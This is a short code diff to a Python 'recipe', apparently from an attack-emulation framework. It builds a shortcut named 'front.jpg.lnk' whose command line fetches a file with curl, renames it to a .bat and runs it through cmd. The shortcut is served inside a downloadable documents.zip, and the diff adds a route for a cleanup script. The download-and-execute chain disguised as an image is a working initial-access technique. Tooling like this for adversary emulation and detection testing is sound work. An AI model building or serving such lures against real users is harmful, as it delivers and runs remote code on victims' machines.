@@ -60,7 +60,7 @@ def pyration16(baseUrl) -> List[AceRoute]:
 
     # Initial Vector: LNK
     args = "/k del %tmp%\\45b8f95j17.txt & del %tmp%\\45b8f95j17.bat & "
-    args += "curl {} > %tmp%\\45b8f95j17.txt &&".format(baseUrl + '/pyration16/raw/Mb7zPnML')
+    args += "curl {} > %tmp%\\45b8f95j17.txt && ".format(baseUrl + '/pyration16/raw/Mb7zPnML')
     args += "rename %tmp%\\45b8f95j17.txt 45b8f95j17.bat && cmd /c %tmp%\\45b8f95j17.bat"
     lnkData: AceBytes = makeLnk(
         name = "front.jpg.lnk",
@@ -79,6 +79,11 @@ def pyration16(baseUrl) -> List[AceRoute]:
     )
     containerFile: AceFile = makeAceFile('documents.zip', container)
     serveHtml: AceRoute = AceRoute('/pyration16/pyration16-documents.zip', container, download=True, downloadName='documents.zip')
+    routes.append(serveHtml)
+
+    # cleanup.bat
+    cleanupbat: AceBytes = readFileContent('recipes/pyration16/cleanup.bat')
+    serveHtml: AceRoute = AceRoute('/pyration16/cleanup.bat', cleanupbat, download=True, downloadName="cleanup-pyration16.bat")
     routes.append(serveHtml)
 
     return routes
